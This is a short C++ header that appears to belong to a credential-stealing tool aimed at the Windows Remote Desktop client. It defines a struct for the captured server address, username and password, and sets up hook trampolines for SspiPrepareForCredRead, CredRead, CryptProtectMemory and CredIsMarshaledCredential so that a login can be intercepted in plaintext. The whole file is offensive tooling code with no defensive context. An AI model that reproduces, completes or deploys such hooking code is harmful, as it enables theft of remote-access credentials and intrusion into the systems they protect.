#pragma once
#define SECURITY_WIN32 

#include <Windows.h>
#include <sspi.h>
#include <wincred.h>

struct RemoteDesktopValues
{
	std::wstring lpServerAddress;
	std::wstring lpUsername;
	std::wstring lpPassword;
} RemoteDesktop, * pRemoteDesktop;

SECURITY_STATUS(WINAPI* True_SspiPrepareForCredRead)(PSEC_WINNT_AUTH_IDENTITY_OPAQUE AuthIdentity, PCWSTR pszTargetName, PULONG pCredmanCredentialType, PCWSTR* ppszCredmanTargetName) = SspiPrepareForCredRead;
BOOL(WINAPI* True_CredRead)(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIAL* Credential) = CredRead;
DPAPI_IMP BOOL(WINAPI* True_CryptProtectMemory)(LPVOID pDataIn, DWORD cbDataIn, DWORD dwFlags) = CryptProtectMemory;
BOOL(WINAPI* True_CredIsMarshaledCredential)(LPCWSTR MarshaledCredential) = CredIsMarshaledCredential;